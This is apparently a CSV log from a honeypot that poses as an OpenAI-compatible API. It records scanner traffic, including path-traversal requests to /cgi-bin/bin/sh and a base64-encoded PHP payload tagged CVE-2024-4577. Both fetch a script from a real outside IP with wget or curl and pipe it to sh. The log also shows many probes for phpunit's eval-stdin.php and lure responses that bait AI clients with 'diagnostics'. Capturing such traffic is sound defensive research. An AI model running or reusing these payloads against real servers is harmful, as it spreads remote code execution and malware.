request_id,timestamp_utc,client_ip,method,path,host,user_agent,x_forwarded_for,request_body_size,response_body_size,stream_chunk_count,model,user_content_flat,request_body_text,response_status,response_reason,response_body_text,duration_ms,error
83f14de0-53c7-44b2-a36b-340835e6f650,2026-04-02T18:48:31.802590+00:00,anon_b93fde94,GET,/public/index.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
dc65b687-eef7-4b4d-ac50-499386a2d5b3,2026-04-02T18:48:37.880673+00:00,anon_b93fde94,GET,/index.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
5a0e5d3d-8fd4-4733-862e-20cd4694e050,2026-04-02T18:48:39.640739+00:00,anon_b93fde94,GET,/index.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
e900793a-4bbb-4297-8316-ae9bbe4dfd7b,2026-04-02T18:48:39.824512+00:00,anon_b93fde94,GET,/containers/json,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
916848ca-e4bd-4362-879c-c12f2b6548e7,2026-04-02T19:26:37.237043+00:00,anon_ac8a3bd6,GET,/,[honeypot-host],visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
e1f7d9f2-892c-4a1a-8cb9-fddc52bc812c,2026-04-02T19:28:24.516384+00:00,anon_ac8a3bd6,GET,/,[honeypot-host],visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
f412f0e2-e21b-4dbc-924e-0eb157b38bf6,2026-04-02T19:33:29.935754+00:00,anon_156573ab,GET,/,[honeypot-host],Mozilla/5.0,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
e26a5fe2-5111-41a1-9fca-71a631e89c3b,2026-04-02T20:22:24.310092+00:00,anon_7df38737,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,[honeypot-host],libredtail-http,,119,316,1,,(wget --no-check-certificate -qO- https://31.57.216.121/sh || curl -sk https://31.57.216.121/sh) | sh -s apache.selfrep,(wget --no-check-certificate -qO- https://31.57.216.121/sh || curl -sk https://31.57.216.121/sh) | sh -s apache.selfrep,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
94f642e0-a5d2-4d73-8dbc-dc85e12d0474,2026-04-02T20:22:24.847750+00:00,anon_7df38737,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh,[honeypot-host],libredtail-http,,119,316,1,,(wget --no-check-certificate -qO- https://31.57.216.121/sh || curl -sk https://31.57.216.121/sh) | sh -s apache.selfrep,(wget --no-check-certificate -qO- https://31.57.216.121/sh || curl -sk https://31.57.216.121/sh) | sh -s apache.selfrep,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
eff1ca95-3e5d-474b-9dd5-c84dc1dd563b,2026-04-02T20:22:25.488673+00:00,anon_7df38737,POST,/hello.world,[honeypot-host],libredtail-http,,241,316,1,,"<?php shell_exec(base64_decode(""KHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtcU8tIGh0dHBzOi8vMzEuNTcuMjE2LjEyMS9zaCB8fCBjdXJsIC1zayBodHRwczovLzMxLjU3LjIxNi4xMjEvc2gpIHwgc2ggLXMgY3ZlXzIwMjRfNDU3Ny5zZWxmcmVw"")); echo(md5(""Hello CVE-2024-4577"")); ?>","<?php shell_exec(base64_decode(""KHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtcU8tIGh0dHBzOi8vMzEuNTcuMjE2LjEyMS9zaCB8fCBjdXJsIC1zayBodHRwczovLzMxLjU3LjIxNi4xMjEvc2gpIHwgc2ggLXMgY3ZlXzIwMjRfNDU3Ny5zZWxmcmVw"")); echo(md5(""Hello CVE-2024-4577"")); ?>",404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
c85c7036-2ecf-45f4-809c-633ac0954996,2026-04-02T20:22:26.139680+00:00,anon_7df38737,POST,/,[honeypot-host],libredtail-http,,241,316,1,,"<?php shell_exec(base64_decode(""KHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtcU8tIGh0dHBzOi8vMzEuNTcuMjE2LjEyMS9zaCB8fCBjdXJsIC1zayBodHRwczovLzMxLjU3LjIxNi4xMjEvc2gpIHwgc2ggLXMgY3ZlXzIwMjRfNDU3Ny5zZWxmcmVw"")); echo(md5(""Hello CVE-2024-4577"")); ?>","<?php shell_exec(base64_decode(""KHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtcU8tIGh0dHBzOi8vMzEuNTcuMjE2LjEyMS9zaCB8fCBjdXJsIC1zayBodHRwczovLzMxLjU3LjIxNi4xMjEvc2gpIHwgc2ggLXMgY3ZlXzIwMjRfNDU3Ny5zZWxmcmVw"")); echo(md5(""Hello CVE-2024-4577"")); ?>",404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
51bb3be3-de13-4ec7-9677-efa6e4795b43,2026-04-02T20:22:26.680257+00:00,anon_7df38737,GET,/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
85c9ee15-c5ba-4e59-8684-3a152451bbe1,2026-04-02T20:22:27.164609+00:00,anon_7df38737,GET,/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
549923e3-b786-4002-9cb3-c3c36c63aaf7,2026-04-02T20:22:27.661015+00:00,anon_7df38737,GET,/vendor/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
cb491f2f-ef8a-49d2-bdd7-1fbac907d4bf,2026-04-02T20:22:28.168430+00:00,anon_7df38737,GET,/vendor/phpunit/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
35ce225d-3e6c-4840-9005-f45e41dd450b,2026-04-02T20:22:28.667443+00:00,anon_7df38737,GET,/vendor/phpunit/phpunit/LICENSE/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
c0eb41c1-ba65-4a93-8cd0-e4522b14d5c6,2026-04-02T20:22:29.136594+00:00,anon_7df38737,GET,/vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
b208b87d-f54c-4737-b6dc-a95d87df22af,2026-04-02T20:22:29.601744+00:00,anon_7df38737,GET,/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
2aa7fe17-956e-4c0b-95c9-e11b8c6c92ee,2026-04-02T20:22:30.099314+00:00,anon_7df38737,GET,/phpunit/phpunit/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
8dd15501-92be-4764-9086-d6910f1cd6dd,2026-04-02T20:22:30.610163+00:00,anon_7df38737,GET,/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
872580f3-bfb9-4ffa-b6b4-08115c673470,2026-04-02T20:22:31.148157+00:00,anon_7df38737,GET,/phpunit/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
7e2c10f1-f959-4847-aa33-6a42a4de3b24,2026-04-02T20:22:31.804450+00:00,anon_7df38737,GET,/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
0862c2e5-acef-4b76-8ab0-fae4d20f0629,2026-04-02T20:22:32.392695+00:00,anon_7df38737,GET,/lib/phpunit/phpunit/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
26af3f16-ad03-4b8d-8893-ee0df906a37b,2026-04-02T20:22:32.942884+00:00,anon_7df38737,GET,/lib/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
a989e50b-c47e-40d0-91c5-a9827d47b716,2026-04-02T20:22:33.552306+00:00,anon_7df38737,GET,/lib/phpunit/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
9fd4f7de-4e08-4402-b5cf-d678862d22ae,2026-04-02T20:22:34.335911+00:00,anon_7df38737,GET,/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
a708fb07-4bec-4266-b782-ad1ec25c28e2,2026-04-02T20:22:35.207287+00:00,anon_7df38737,GET,/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
2fa2b305-29e9-4ee9-8a57-7881b21b2b86,2026-04-02T20:22:36.277583+00:00,anon_7df38737,GET,/www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
c8268551-ab64-4f45-ab72-32ea2849f72f,2026-04-02T20:22:37.128896+00:00,anon_7df38737,GET,/ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
66aed8c9-bad1-48b7-a2a4-9dda3ba7ac68,2026-04-02T20:22:38.067652+00:00,anon_7df38737,GET,/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
4399e157-9a4e-4d16-a68c-a2b5738339b4,2026-04-02T20:22:38.906056+00:00,anon_7df38737,GET,/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
575ba102-0be2-46db-ac91-cdafcbf3e040,2026-04-02T20:22:39.565866+00:00,anon_7df38737,GET,/ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
170ac1b2-e285-4cff-a608-13230048db41,2026-04-02T20:22:40.250219+00:00,anon_7df38737,GET,/V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
e52b5086-4b8c-47f5-9ef9-3e3f77f823d3,2026-04-02T20:22:40.947742+00:00,anon_7df38737,GET,/tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
07d3d815-dd14-4fbc-90dd-a29107034280,2026-04-02T20:22:41.598213+00:00,anon_7df38737,GET,/test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
540015dd-e751-433b-b3d9-b11b542ab3ed,2026-04-02T20:22:42.151171+00:00,anon_7df38737,GET,/testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
c0df222b-6aea-426f-b40b-6906cf17b631,2026-04-02T20:22:42.699163+00:00,anon_7df38737,GET,/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
f57bec50-e263-4f0d-8d94-cf4f2d1a8a3a,2026-04-02T20:22:43.213809+00:00,anon_7df38737,GET,/demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
6cbf6dea-a30d-426d-b099-3d548070237e,2026-04-02T20:22:43.734236+00:00,anon_7df38737,GET,/cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
607345bc-0e73-4327-a94c-f505228150a4,2026-04-02T20:22:44.270300+00:00,anon_7df38737,GET,/crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
b48cdb3c-a44b-41f9-b601-d008ec2e8d7c,2026-04-02T20:22:44.889043+00:00,anon_7df38737,GET,/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
f3c45495-20f5-42e1-a6a0-42da18de39b4,2026-04-02T20:22:45.417968+00:00,anon_7df38737,GET,/backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
69103e47-b1bf-4de5-8870-266508b411d6,2026-04-02T20:22:46.009322+00:00,anon_7df38737,GET,/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
df4eea3a-cdec-445b-8c5e-c436713f6c92,2026-04-02T20:22:46.812895+00:00,anon_7df38737,GET,/workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
94ab6cc8-2d5b-4a57-b79f-3b41adb4d3c0,2026-04-02T20:22:47.693476+00:00,anon_7df38737,GET,/panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
277d8984-68f8-4b56-a1ea-2ad26c96d4dd,2026-04-02T20:22:48.506659+00:00,anon_7df38737,GET,/public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
eb8b93c8-09a5-4d82-a90a-285351d74d4f,2026-04-02T20:22:49.244742+00:00,anon_7df38737,GET,/apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
3ebecb1d-ae53-465a-9d57-18459334f9fe,2026-04-02T20:22:49.804010+00:00,anon_7df38737,GET,/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
